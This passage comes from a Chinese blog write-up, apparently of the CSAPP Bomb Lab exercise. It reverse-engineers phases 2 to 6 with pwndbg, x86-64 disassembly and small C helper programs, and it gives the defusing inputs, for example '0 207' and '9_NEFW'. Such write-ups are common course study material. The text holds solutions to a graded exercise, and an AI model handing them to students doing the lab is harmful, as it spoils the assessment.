1 作比较，如果相等跳转，不相等 call explode_bomb，所以这里我们需要让他相等，当然在调试器里面我们可以为所欲为，直接假装它们一样，跳转到对应的位置。</p><p>我们直接设置 $rip 寄存器帮助他跳转过去，使用这个命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;set $rip=phase_2+52</span><br></pre></td></tr></table></figure><p><img src="/2022/09/22/CSAPP_3/5.png" alt="5"></p><p>然后发现进入了一层循环：</p><p>从上往下分析汇编代码，每次取出 [rbx] 的值与 eax 作比较，循环终止条件为 rbx==rbp，rbx每次循环+4，eax每次执行翻倍。其实这个地方应该就是在遍历我们输入的六个数了，那么第一个数是 1，后面都翻倍，我们不难想到这六个数应该是</p><p>1 2 4 8 16 32</p><p>第二个炸弹也成功拆除了。</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>这里为了方便调试，我们选择在 phase_3 下断点（b phase_3），然后把前两个拆弹语句写到 1.txt 当中，然后在运行的时候加上参数就能直接跳过前两关，直接进入第三关的调试分析了。</p><p>在 gdb 调试器里面我们可以通过 r 1.txt 的方式添加命令行参数。</p><p>随便输入一串字符串之后，我们断在了 phase_3 函数当中，可以发现中间调用了一个 scanf 函数，并且有参数 %d %d，那么我们也可以推断应该是两个整数，于是我们换 0 0 进去调试看看。</p><p><img src="/2022/09/22/CSAPP_3/6.png" alt="6"></p><p>然后下面是判断输入的数的个数要超过 1 个，其实也就是两个数了，然后跳转到下面的 cmp [rsp+8],7 并且超过 7 跳转，我们也可以通过 disass phase_3 看看这个跳转的地方。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">   0x0000000000400f43 &lt;+0&gt;:sub    rsp,0x18</span><br><span class="line">   0x0000000000400f47 &lt;+4&gt;:lea    rcx,[rsp+0xc]</span><br><span class="line">   0x0000000000400f4c &lt;+9&gt;:lea    rdx,[rsp+0x8]</span><br><span class="line">   0x0000000000400f51 &lt;+14&gt;:mov    esi,0x4025cf</span><br><span class="line">   0x0000000000400f56 &lt;+19&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400f5b &lt;+24&gt;:call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000400f60 &lt;+29&gt;:cmp    eax,0x1</span><br><span class="line">=&gt; 0x0000000000400f63 &lt;+32&gt;:jg     0x400f6a &lt;phase_3+39&gt;</span><br><span class="line">   0x0000000000400f65 &lt;+34&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f6a &lt;+39&gt;:cmp    DWORD PTR [rsp+0x8],0x7</span><br><span class="line">   0x0000000000400f6f &lt;+44&gt;:ja     0x400fad &lt;phase_3+106&gt;</span><br><span class="line">   0x0000000000400f71 &lt;+46&gt;:mov    eax,DWORD PTR [rsp+0x8]</span><br><span class="line">   0x0000000000400f75 &lt;+50&gt;:jmp    QWORD PTR [rax*8+0x402470]</span><br><span class="line">   0x0000000000400f7c &lt;+57&gt;:mov    eax,0xcf</span><br><span class="line">   0x0000000000400f81 &lt;+62&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f83 &lt;+64&gt;:mov    eax,0x2c3</span><br><span class="line">   0x0000000000400f88 &lt;+69&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f8a &lt;+71&gt;:mov    eax,0x100</span><br><span class="line">   0x0000000000400f8f &lt;+76&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f91 &lt;+78&gt;:mov    eax,0x185</span><br><span class="line">   0x0000000000400f96 &lt;+83&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f98 &lt;+85&gt;:mov    eax,0xce</span><br><span class="line">   0x0000000000400f9d &lt;+90&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f9f &lt;+92&gt;:mov    eax,0x2aa</span><br><span class="line">   0x0000000000400fa4 &lt;+97&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fa6 &lt;+99&gt;:mov    eax,0x147</span><br><span class="line">   0x0000000000400fab &lt;+104&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fad &lt;+106&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fb2 &lt;+111&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400fb7 &lt;+116&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fb9 &lt;+118&gt;:mov    eax,0x137</span><br><span class="line">   0x0000000000400fbe &lt;+123&gt;:cmp    eax,DWORD PTR [rsp+0xc]</span><br><span class="line">   0x0000000000400fc2 &lt;+127&gt;:je     0x400fc9 &lt;phase_3+134&gt;</span><br><span class="line">   0x0000000000400fc4 &lt;+129&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fc9 &lt;+134&gt;:add    rsp,0x18</span><br><span class="line">   0x0000000000400fcd &lt;+138&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>我们很清楚的可以看到，超过 7 直接跳转 call explode_bomb。</p><p>其实这里我们就很清楚地发现了，这里应该是 switch 分发语句，这里有一个 0x402470 + 8*eax ，那么我们不难推测，0x402470 应该就是跳转表的位置了，我们使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;x/8gx 0x402470</span><br></pre></td></tr></table></figure><p>打印出跳转表的内容。</p><p><img src="/2022/09/22/CSAPP_3/7.png" alt="7"></p><p>我们随便选一个，比如 eax=0 的时候，会跳转到 0x400f7c，这里 mov eax,0xcf，给 eax 寄存器赋值了，然后跳转到 0x400fbe 中和 [rsp+0xc] 进行比较，那么这里应该是我们输入的第二个数了，相等跳转绕过 call explode_bomb 函数。所以第三关，我们填写 0 207 可以过去这一关，当然也可以看看其它跳转位置分别给了啥值，这一关答案不固定。</p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p>同样的思路，我们把前三关的语句保存在文件当中，给第四个函数下断点，运行，输入，来到输入这里。</p><p><img src="/2022/09/22/CSAPP_3/8.png" alt="8"></p><p>可以看到依然是两个整数，那重新来，换俩零看看。</p><p>首先，第一个判断</p><p><img src="/2022/09/22/CSAPP_3/9.png" alt="9"></p><p>判断输入的，应该是第一个数是否小于 0xe，小于则跳转到 +46的位置，那么我们可以反汇编看看它不跳转会到哪里去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">   0x000000000040100c &lt;+0&gt;:sub    rsp,0x18</span><br><span class="line">   0x0000000000401010 &lt;+4&gt;:lea    rcx,[rsp+0xc]</span><br><span class="line">   0x0000000000401015 &lt;+9&gt;:lea    rdx,[rsp+0x8]</span><br><span class="line">   0x000000000040101a &lt;+14&gt;:mov    esi,0x4025cf</span><br><span class="line">   0x000000000040101f &lt;+19&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000401024 &lt;+24&gt;:call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000401029 &lt;+29&gt;:cmp    eax,0x2</span><br><span class="line">   0x000000000040102c &lt;+32&gt;:jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line">=&gt; 0x000000000040102e &lt;+34&gt;:cmp    DWORD PTR [rsp+0x8],0xe</span><br><span class="line">   0x0000000000401033 &lt;+39&gt;:jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">   0x0000000000401035 &lt;+41&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040103a &lt;+46&gt;:mov    edx,0xe</span><br><span class="line">   0x000000000040103f &lt;+51&gt;:mov    esi,0x0</span><br><span class="line">   0x0000000000401044 &lt;+56&gt;:mov    edi,DWORD PTR [rsp+0x8]</span><br><span class="line">   0x0000000000401048 &lt;+60&gt;:call   0x400fce &lt;func4&gt;</span><br><span class="line">   0x000000000040104d &lt;+65&gt;:test   eax,eax</span><br><span class="line">   0x000000000040104f &lt;+67&gt;:jne    0x401058 &lt;phase_4+76&gt;</span><br><span class="line">   0x0000000000401051 &lt;+69&gt;:cmp    DWORD PTR [rsp+0xc],0x0</span><br><span class="line">   0x0000000000401056 &lt;+74&gt;:je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">   0x0000000000401058 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040105d &lt;+81&gt;:add    rsp,0x18</span><br><span class="line">   0x0000000000401061 &lt;+85&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>那可以看到，不跳转直接 G 了，所以第一个数要小于等于 14。</p><p>我们直接就往后看吧，然后调用 func4 之前，传递了三个参数，rdi 给了我们输入的第一个数，rsi给了0，rdx 给了 14。</p><p>我们再看看 func4 的反汇编，是一个递归函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x0000000000400fce &lt;+0&gt;:sub    rsp,0x8</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:mov    eax,edx</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:sub    eax,esi</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:mov    ecx,eax</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:shr    ecx,0x1f</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:add    eax,ecx</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:sar    eax,1</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:lea    ecx,[rax+rsi*1]</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:cmp    ecx,edi</span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:jle    0x400ff2 &lt;func4+36&gt;</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:lea    edx,[rcx-0x1]</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:call   0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:add    eax,eax</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:jmp    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:cmp    ecx,edi</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:jge    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:lea    esi,[rcx+0x1]</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:call   0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:lea    eax,[rax+rax*1+0x1]</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:add    rsp,0x8</span><br><span class="line">   0x000000000040100b &lt;+61&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>假设它的函数是 int func4(x,y,z)，那么我们可以大致分析一下它的逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(x,y,z)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val=z;</span><br><span class="line">    val-=y;</span><br><span class="line">    <span class="keyword">int</span> i=val;</span><br><span class="line">    i&gt;&gt;=<span class="number">31</span>;</span><br><span class="line">    val+=i;</span><br><span class="line">    val&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    i=val+y;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;x)&#123;</span><br><span class="line">        z=i<span class="number">-1</span>;</span><br><span class="line">        func4(x,y,z);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        val=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;x)&#123;</span><br><span class="line">            y+=<span class="number">1</span>;</span><br><span class="line">            func4(x,y,z);</span><br><span class="line">            val=<span class="number">2</span>*val+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上函数的反编译原型大致是按照汇编语句一条一条翻译过来的，应该比较通俗易懂，对着汇编代码很容易就能读出来。</p><p>整合一下，形成下面的语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(x,y,z)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val=z-y;</span><br><span class="line">    <span class="keyword">int</span> i=val;</span><br><span class="line">    i&gt;&gt;=<span class="number">31</span>;</span><br><span class="line">    val+=i;</span><br><span class="line">    val&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    i=y+val;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;x)&#123;</span><br><span class="line">        val=func4(x,y,i<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        val=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;x)&#123;</span><br><span class="line">            val=func4(x,y+<span class="number">1</span>,z);</span><br><span class="line">            val=<span class="number">2</span>*val+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 func4 返回非 0，它也是直接跳转爆炸了，所以我们要让 func4 返回 0，它的调用是 func4(x,0,14)，然后后面第二个数，为 0直接跳转走了，所以我们第二个这里输入一个 0 才可以。</p><p>我们也可以自己编写程序，来检查一下什么时候返回 0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val=z-y;</span><br><span class="line">    <span class="keyword">int</span> i=val;</span><br><span class="line">    i&gt;&gt;=<span class="number">31</span>;</span><br><span class="line">    val+=i;</span><br><span class="line">    val&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    i=val+y;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;x)&#123;</span><br><span class="line">        val=func4(x,y,i<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        val=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;x)&#123;</span><br><span class="line">            val=func4(x,y+<span class="number">1</span>,z);</span><br><span class="line">            val=<span class="number">2</span>*val+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,func4(i,<span class="number">0</span>,<span class="number">14</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以发现，x=0,1,3,7的时候才能返回 0。</p><p>所以我们第一次猜 0 0 大概率就直接过去了。</p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><p>一样的方法进去，然后随便输入个字符串</p><p><img src="/2022/09/22/CSAPP_3/10.png"></p><p>后面可以i发现有一个对长度的判断，要求长度为 6。</p><p><img src="/2022/09/22/CSAPP_3/11.png"></p><p>到最后可以发现调用了一个 string_not_equal 函数，被比较的正是 flyers 和我们的输入，难道这题跟第一题一样？</p><p>我们输入 flyers 测试看看。</p><p><img src="/2022/09/22/CSAPP_3/12.png"></p><p>可以发现发生了改变，我们的输入发生了变化，这一题其实比较接近真正的逆向题目了，对输入处理然后和一个字符串进行比较。</p><p>我们可以反汇编看看它如何处理的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">   0x0000000000401062 &lt;+0&gt;:push   rbx</span><br><span class="line">   0x0000000000401063 &lt;+1&gt;:sub    rsp,0x20</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:mov    rbx,rdi</span><br><span class="line">   0x000000000040106a &lt;+8&gt;:mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x0000000000401073 &lt;+17&gt;:mov    QWORD PTR [rsp+0x18],rax</span><br><span class="line">   0x0000000000401078 &lt;+22&gt;:xor    eax,eax</span><br><span class="line">   0x000000000040107a &lt;+24&gt;:call   0x40131b &lt;string_length&gt;</span><br><span class="line">   0x000000000040107f &lt;+29&gt;:cmp    eax,0x6</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401089 &lt;+39&gt;:jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:movzx  ecx,BYTE PTR [rbx+rax*1]</span><br><span class="line">   0x000000000040108f &lt;+45&gt;:mov    BYTE PTR [rsp],cl</span><br><span class="line">   0x0000000000401092 &lt;+48&gt;:mov    rdx,QWORD PTR [rsp]</span><br><span class="line">   0x0000000000401096 &lt;+52&gt;:and    edx,0xf</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:movzx  edx,BYTE PTR [rdx+0x4024b0]</span><br><span class="line">   0x00000000004010a0 &lt;+62&gt;:mov    BYTE PTR [rsp+rax*1+0x10],dl</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:add    rax,0x1</span><br><span class="line">   0x00000000004010a8 &lt;+70&gt;:cmp    rax,0x6</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:jne    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010ae &lt;+76&gt;:mov    BYTE PTR [rsp+0x16],0x0</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:mov    esi,0x40245e</span><br><span class="line">   0x00000000004010b8 &lt;+86&gt;:lea    rdi,[rsp+0x10]</span><br><span class="line">=&gt; 0x00000000004010bd &lt;+91&gt;:call   0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:test   eax,eax</span><br><span class="line">   0x00000000004010c4 &lt;+98&gt;:je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010cb &lt;+105&gt;:nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00000000004010d0 &lt;+110&gt;:jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010d2 &lt;+112&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000004010d7 &lt;+117&gt;:jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010d9 &lt;+119&gt;:mov    rax,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:xor    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x00000000004010e7 &lt;+133&gt;:je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">   0x00000000004010e9 &lt;+135&gt;:call   0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x00000000004010ee &lt;+140&gt;:add    rsp,0x20</span><br><span class="line">   0x00000000004010f2 &lt;+144&gt;:pop    rbx</span><br><span class="line">   0x00000000004010f3 &lt;+145&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>很明显可以看到 +41 和 +74 之间形成了一个循环，循环次数为 6，大概是在对字符串每一位进行处理。先到 +41 观察一下寄存器的状态。</p><p><img src="/2022/09/22/CSAPP_3/13.png"></p><p>很明显 rbx 就是我们输入的 string，ecx每次取出一个字符然后低四位（&amp;0xf）取出，和 0x4024b0 这个地址相加，所取字节应该会覆盖原来的字符串，那么我们看看 0x4024b0 这个字符串是什么，使用 p (char *)0x4024b0 命令打印。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$1 = 0x4024b0 &lt;array&gt; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure><p>很明显，偏移量只有 0-15，所以实际表也就只是</p><p>maduiersnfotvbyl</p><p>我们的 flyers 在里面的偏移分别是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+9 +15 +14 +5 +6 +7</span><br></pre></td></tr></table></figure><p>这只是低位，高位是不确定的，可以为任意值，我们0-15跑一遍，取出任何一个都可以。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[]=&#123;+<span class="number">9</span>,+<span class="number">15</span>,+<span class="number">14</span>,+<span class="number">5</span>,+<span class="number">6</span>,+<span class="number">7</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">15</span>;j++)&#123;</span><br><span class="line"><span class="built_in">putchar</span>((j&lt;&lt;<span class="number">4</span>)|a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/09/22/CSAPP_3/14.png"></p><p>这里我输入了 9_NEFW</p><p><img src="/2022/09/22/CSAPP_3/15.png"></p><p>成功过关</p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><p>终于来到了这关，以前没有打过的一关。。</p><p>进去依然是读入六个数字。</p><p><img src="/2022/09/22/CSAPP_3/16.png"></p><p>可以看到读入的六个数存在了栈顶。</p><p>后面判断 dword[rsp]-1&lt;=5，说明第一个数的范围就是 1-5。</p><p><img src="/2022/09/22/CSAPP_3/17.png"></p><p>后面疑似开始循环了，以 r12 寄存器作为循环变量。</p><p>后面就是 eax 取 r12 的值，然后再取 rax=dword [rsp+rax*4]，这里就是循环读我们输入的数字，放到 rax 寄存器当中。</p><p>读到这里好像发现有双重循环，输出反汇编观察一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 